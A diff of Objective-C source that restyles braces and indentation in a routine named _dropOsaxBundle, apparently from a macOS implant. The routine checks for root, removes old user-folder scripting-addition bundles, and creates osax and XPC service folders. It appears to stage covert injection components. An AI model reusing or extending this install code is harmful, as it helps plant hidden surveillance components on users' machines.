@@ -2260,41 +2260,40 @@ void lionSendEventToPid(pid_t pidP)
 - (void)_dropOsaxBundle
 {
   NSString *osaxRootPath = nil;
-  NSString *osaxUserPath = nil;
   
   if (getuid() == 0 || geteuid() == 0) 
-  {
-    osaxRootPath = [[NSString alloc] initWithFormat: @"/%@",
-                    OSAX_ROOT_PATH];
-    
-    // i'm root: remove old low privs osax from user folders
-    NSString *osaxLowPrivsPath = [[NSString alloc]
-                                  initWithFormat: @"/Users/%@/%@/%@",
-                                  NSUserName(),
-                                  OSAX_ROOT_PATH,
-                                  EXT_BUNDLE_FOLDER];
-    
-    if ([[NSFileManager defaultManager] fileExistsAtPath: osaxLowPrivsPath])
     {
-      [[NSFileManager defaultManager] removeItemAtPath: osaxLowPrivsPath
-                                                 error: nil];
+      osaxRootPath = [[NSString alloc] initWithFormat: @"/%@",
+                   OSAX_ROOT_PATH];
+
+      // i'm root: remove old low privs osax from user folders
+      NSString *osaxLowPrivsPath = [[NSString alloc]
+        initWithFormat: @"/Users/%@/%@/%@",
+        NSUserName(),
+        OSAX_ROOT_PATH,
+        EXT_BUNDLE_FOLDER];
+
+      if ([[NSFileManager defaultManager] fileExistsAtPath: osaxLowPrivsPath])
+        {
+          [[NSFileManager defaultManager] removeItemAtPath: osaxLowPrivsPath
+                                                     error: nil];
+        }
+
     }
-    
-  }
   else
-  {
-    osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
-                    NSUserName(),
-                    OSAX_ROOT_PATH];
-  }
+    {
+      osaxRootPath = [[NSString alloc] initWithFormat: @"/Users/%@/%@",
+                   NSUserName(),
+                   OSAX_ROOT_PATH];
+    }
   
   if (![[NSFileManager defaultManager] fileExistsAtPath: osaxRootPath])
-  {
-    [[NSFileManager defaultManager] createDirectoryAtPath: osaxRootPath 
-                              withIntermediateDirectories: NO 
-                                               attributes: nil 
-                                                    error: nil];
-  }
+    {
+      [[NSFileManager defaultManager] createDirectoryAtPath: osaxRootPath 
+                                withIntermediateDirectories: NO 
+                                                 attributes: nil 
+                                                      error: nil];
+    }
   
 #ifdef DEBUG_CORE
   infoLog(@"osaxRootPath %@", osaxRootPath);
@@ -2312,10 +2311,10 @@ void lionSendEventToPid(pid_t pidP)
 #endif
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: osaxPath])
-  {
+    {
       [[NSFileManager defaultManager] removeItemAtPath: osaxPath
                                                  error: nil];
-  }
+    }
   
   //
   // Scripting folder
@@ -2418,12 +2417,12 @@ void lionSendEventToPid(pid_t pidP)
                               XPC_BUNDLE_FRAMEWORK_PATH];
   
   if (![[NSFileManager defaultManager] fileExistsAtPath: xpcPath])
-  {
+    {
 #ifdef DEBUG_CORE
-    infoLog(@"creating folder %@ for xpc services", xpcPath);
+      infoLog(@"creating folder %@ for xpc services", xpcPath);
 #endif
-     mkdir([xpcPath UTF8String], 0755);
-  }
+      mkdir([xpcPath UTF8String], 0755);
+    }
   
   [xpcPath appendString: XPC_BUNDLE_FOLDER_PREFIX];
   [xpcPath appendString: gMyXPCName];
